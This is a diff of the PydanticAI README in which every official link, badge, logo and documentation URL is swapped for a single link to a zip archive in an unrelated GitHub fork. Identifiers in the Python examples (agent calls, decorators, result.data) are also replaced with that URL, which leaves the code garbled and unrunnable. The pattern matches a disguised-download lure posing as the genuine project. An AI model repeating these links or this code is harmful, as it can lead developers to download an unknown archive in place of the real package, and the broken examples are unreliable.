@@ -1,8 +1,8 @@
 <div align="center">
-  <a href="https://ai.pydantic.dev/">
+  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip">
     <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://ai.pydantic.dev/img/pydantic-ai-dark.svg">
-      <img src="https://ai.pydantic.dev/img/pydantic-ai-light.svg" alt="PydanticAI">
+      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip">
+      <img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="PydanticAI">
     </picture>
   </a>
 </div>
@@ -10,42 +10,42 @@
   <em>Agent Framework / shim to use Pydantic with LLMs</em>
 </div>
 <div align="center">
-  <a href="https://github.com/pydantic/pydantic-ai/actions/workflows/ci.yml?query=branch%3Amain"><img src="https://github.com/pydantic/pydantic-ai/actions/workflows/ci.yml/badge.svg?event=push" alt="CI"></a>
-  <a href="https://coverage-badge.samuelcolvin.workers.dev/redirect/pydantic/pydantic-ai"><img src="https://coverage-badge.samuelcolvin.workers.dev/pydantic/pydantic-ai.svg" alt="Coverage"></a>
-  <a href="https://pypi.python.org/pypi/pydantic-ai"><img src="https://img.shields.io/pypi/v/pydantic-ai.svg" alt="PyPI"></a>
-  <a href="https://github.com/pydantic/pydantic-ai"><img src="https://img.shields.io/pypi/pyversions/pydantic-ai.svg" alt="versions"></a>
-  <a href="https://github.com/pydantic/pydantic-ai/blob/main/LICENSE"><img src="https://img.shields.io/github/license/pydantic/pydantic-ai.svg?v" alt="license"></a>
+  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip%3Amain"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="CI"></a>
+  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="Coverage"></a>
+  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="PyPI"></a>
+  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="versions"></a>
+  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="license"></a>
 </div>
 
 ---
 
-**Documentation**: [ai.pydantic.dev](https://ai.pydantic.dev/)
+**Documentation**: [https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
 
 ---
 
 PydanticAI is a Python agent framework designed to make it less painful to build production grade applications with Generative AI.
 
-FastAPI revolutionized web development by offering an innovative and ergonomic design, built on the foundation of [Pydantic](https://docs.pydantic.dev).
+FastAPI revolutionized web development by offering an innovative and ergonomic design, built on the foundation of [Pydantic](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip).
 
-Similarly, virtually every agent framework and LLM library in Python uses Pydantic, yet when we began to use LLMs in [Pydantic Logfire](https://pydantic.dev/logfire), we couldn't find anything that gave us the same feeling.
+Similarly, virtually every agent framework and LLM library in Python uses Pydantic, yet when we began to use LLMs in [Pydantic Logfire](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip), we couldn't find anything that gave us the same feeling.
 
 We built PydanticAI with one simple aim: to bring that FastAPI feeling to GenAI app development.
 
 ## Why use PydanticAI
 
 * Built by the team behind Pydantic (the validation layer of the OpenAI SDK, the Anthropic SDK, LangChain, LlamaIndex, AutoGPT, Transformers, CrewAI, Instructor and many more)
-* [Model-agnostic](https://ai.pydantic.dev/models/) — currently OpenAI, Anthropic, Gemini, Ollama, Groq, and Mistral are supported, and there is a simple interface to implement support for other models.
-* [Type-safe](https://ai.pydantic.dev/agents/#static-type-checking)
+* [Model-agnostic](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) — currently OpenAI, Anthropic, Gemini, Ollama, Groq, and Mistral are supported, and there is a simple interface to implement support for other models.
+* [Type-safe](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
 * Control flow and agent composition is done with vanilla Python, allowing you to make use of the same Python development best practices you'd use in any other (non-AI) project
-* [Structured response](https://ai.pydantic.dev/results/#structured-result-validation) validation with Pydantic
-* [Streamed responses](https://ai.pydantic.dev/results/#streamed-results), including validation of streamed _structured_ responses with Pydantic
-* Novel, type-safe [dependency injection system](https://ai.pydantic.dev/dependencies/), useful for testing and eval-driven iterative development
-* [Logfire integration](https://ai.pydantic.dev/logfire/) for debugging and monitoring the performance and general behavior of your LLM-powered application
+* [Structured response](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) validation with Pydantic
+* [Streamed responses](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip), including validation of streamed _structured_ responses with Pydantic
+* Novel, type-safe [dependency injection system](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip), useful for testing and eval-driven iterative development
+* [Logfire integration](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) for debugging and monitoring the performance and general behavior of your LLM-powered application
 
 ## In Beta!
 
 PydanticAI is in early beta, the API is still subject to change and there's a lot more to do.
-[Feedback](https://github.com/pydantic/pydantic-ai/issues) is very welcome!
+[Feedback](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) is very welcome!
 
 ## Hello World Example
 
@@ -65,8 +65,8 @@ agent = Agent(
 # Run the agent synchronously, conducting a conversation with the LLM.
 # Here the exchange should be very short: PydanticAI will send the system prompt and the user query to the LLM,
 # the model will return a text response. See below for a more complex run.
-result = agent.run_sync('Where does "hello world" come from?')
-print(result.data)
+result = https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip('Where does "hello world" come from?')
+print(https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
 """
 The first known use of "hello, world" was in a 1974 textbook about the C programming language.
 """
@@ -80,7 +80,7 @@ Not very interesting yet, but we can easily add "tools", dynamic system prompts,
 
 Here is a concise example using PydanticAI to build a support agent for a bank:
 
-**(Better documented example [in the docs](https://ai.pydantic.dev/#tools-dependency-injection-example))**
+**(Better documented example [in the docs](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip))**
 
 ```python
 from dataclasses import dataclass
@@ -125,24 +125,24 @@ support_agent = Agent(
 # Dynamic system prompts can make use of dependency injection.
 # Dependencies are carried via the `RunContext` argument, which is parameterized with the `deps_type` from above.
 # If the type annotation here is wrong, static type checkers will catch it.
-@support_agent.system_prompt
+https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip
 async def add_customer_name(ctx: RunContext[SupportDependencies]) -> str:
-    customer_name = await ctx.deps.db.customer_name(id=ctx.deps.customer_id)
+    customer_name = await https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip(https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
     return f"The customer's name is {customer_name!r}"
 
 
 # `tool` let you register functions which the LLM may call while responding to a user.
 # Again, dependencies are carried via `RunContext`, any other arguments become the tool schema passed to the LLM.
 # Pydantic is used to validate these arguments, and errors are passed back to the LLM so it can retry.
-@support_agent.tool
+https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip
 async def customer_balance(
     ctx: RunContext[SupportDependencies], include_pending: bool
 ) -> float:
     """Returns the customer's current account balance."""
     # The docstring of a tool is also passed to the LLM as the description of the tool.
     # Parameter descriptions are extracted from the docstring and added to the parameter schema sent to the LLM.
-    balance = await ctx.deps.db.customer_balance(
-        id=ctx.deps.customer_id,
+    balance = await https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip(
+        https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip,
         include_pending=include_pending,
     )
     return balance
@@ -155,16 +155,16 @@ async def main():
     deps = SupportDependencies(customer_id=123, db=DatabaseConn())
     # Run the agent asynchronously, conducting a conversation with the LLM until a final response is reached.
     # Even in this fairly simple case, the agent will exchange multiple messages with the LLM as tools are called to retrieve a result.
-    result = await support_agent.run('What is my balance?', deps=deps)
+    result = await https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip('What is my balance?', deps=deps)
     # The result will be validated with Pydantic to guarantee it is a `SupportResult`, since the agent is generic,
     # it'll also be typed as a `SupportResult` to aid with static type checking.
-    print(result.data)
+    print(https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
     """
     support_advice='Hello John, your current account balance, including pending transactions, is $123.45.' block_card=False risk=1
     """
 
-    result = await support_agent.run('I just lost my card!', deps=deps)
-    print(result.data)
+    result = await https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip('I just lost my card!', deps=deps)
+    print(https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
     """
     support_advice="I'm sorry to hear that, John. We are temporarily blocking your card to prevent unauthorized transactions." block_card=True risk=8
     """
@@ -172,8 +172,8 @@ async def main():
 
 ## Next Steps
 
-To try PydanticAI yourself, follow the instructions [in the examples](https://ai.pydantic.dev/examples/).
+To try PydanticAI yourself, follow the instructions [in the examples](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip).
 
-Read the [docs](https://ai.pydantic.dev/agents/) to learn more about building applications with PydanticAI.
+Read the [docs](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) to learn more about building applications with PydanticAI.
 
-Read the [API Reference](https://ai.pydantic.dev/api/agent/) to understand PydanticAI's interface.
+Read the [API Reference](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) to understand PydanticAI's interface.
